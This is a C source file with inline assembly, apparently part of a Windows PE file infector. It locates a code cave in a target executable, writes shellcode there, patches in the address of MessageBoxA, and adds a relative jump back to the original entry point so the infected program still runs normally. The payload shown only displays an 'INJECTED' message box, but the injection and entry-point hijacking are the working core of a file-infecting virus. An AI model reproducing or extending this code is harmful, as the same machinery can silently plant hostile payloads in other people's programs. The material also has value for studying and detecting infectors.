#include <Windows.h>
#include "exe.h"
#include "shellcode.h"

#pragma warning(disable : 4996)

#define NOP_COUNT 30
#define MESSAGEBOX_ADDRESS_PLACE_HOLDER 0xAAAAAAAA
#define ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER 0xBBBBBBBB
#define RELATIVE_JUMP_OPCODE 0xE9

void __declspec(naked) shellcode(VOID) {
    __asm {
        call    routine

        routine :
        pop     ebp
            sub     ebp, offset routine
            push    0                                // MB_OK
            lea     eax, [ebp + szCaption]
            push    eax                              // lpCaption
            lea     eax, [ebp + szText]
            push    eax                              // lpText
            push    0                                // hWnd
            mov     eax, MESSAGEBOX_ADDRESS_PLACE_HOLDER                  // move eax messagebox address
            call    eax                              // MessageBoxA

            popad
            mov eax, ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER
            //mov     eax, 0xBBBBBBBB                 // move eax relative jump offset
            //jmp before_call

            //set_correct_relative_jmp:
            //pop ebx //ebx got eip after call
            //add ebx, before_call
            //sub ebx, after_call

            //jmp_to_original_entery_point:
            //push eax
            //ret// MessageBoxA
            //
            //before_call:
            //call set_correct_relative_jmp
            //after_call:

            szCaption :
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            szText :
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
    }
}

DWORD get_relative_jump(EXE_file* infected, DWORD jump_address)
{
    int relative_jump = 0;
    // Adding the address size (jumping from end of jump instruction).
    relative_jump = jump_address + 4;

    // switch from row data to RVA.
    relative_jump = relative_jump - (DWORD)infected->mapped_handle - (DWORD)infected->infected_section->PointerToRawData + (DWORD)infected->infected_section->VirtualAddress;
    // switch to virtual address.
    relative_jump += (DWORD)infected->headers->OptionalHeader.ImageBase;
    relative_jump = (DWORD)infected->entry_address - relative_jump;
    return relative_jump;
}

LPVOID set_addrress_in_shellcode(EXE_file* infected, LPBYTE codecave_address, DWORD shellcode_size)
{

    // dynamically obtain address of function
    HMODULE hModule = LoadLibrary(L"User32.dll");
    PIMAGE_DATA_DIRECTORY relocation_directory = { 0 };

    LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");
    DWORD relative_jump = 0;
    DWORD offset = 0;
    DWORD* current_call_address = NULL;
    PCHAR address_of_relative_jump = NULL;
    PVOID reloction_end = NULL;
    do
    {
        current_call_address = (PCHAR)codecave_address + offset;
        if (*current_call_address == MESSAGEBOX_ADDRESS_PLACE_HOLDER) {
            // insert function's address
            *current_call_address = (DWORD)lpAddress;
            FreeLibrary(hModule);
            break;
        }
        offset++;
    } while (offset < shellcode_size);

    do
    {
        // modify OEP address offset
        current_call_address = (PCHAR)codecave_address + offset;
        if (*current_call_address == ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER) {
            
            address_of_relative_jump = (PCHAR)current_call_address - 1;
            *address_of_relative_jump = RELATIVE_JUMP_OPCODE;
            // insert address of entry point
            relative_jump = get_relative_jump(infected, (DWORD)current_call_address);
            *current_call_address = relative_jump;
            break;
        }
        offset++;
    } while (offset < shellcode_size);

    strcpy((char*)codecave_address + shellcode_size - NOP_COUNT, "INJECTED");
    strcpy((char*)codecave_address + shellcode_size - 20, "I 10ve ass3mb!y");

    return NULL;
}

DWORD get_shellcode_size()
{
    int counter = 0;
    //random offset to fix bug.
    char* func_pointer = (char*)shellcode + SHELLCODE_ADDRESS_BUG;
    unsigned char current_char = 0;
    do
    {
        current_char = *(func_pointer + counter);
        counter++;

    } while (current_char != 0x90);
    //10 nop at the end of shellcode.
    return counter + NOP_COUNT;
}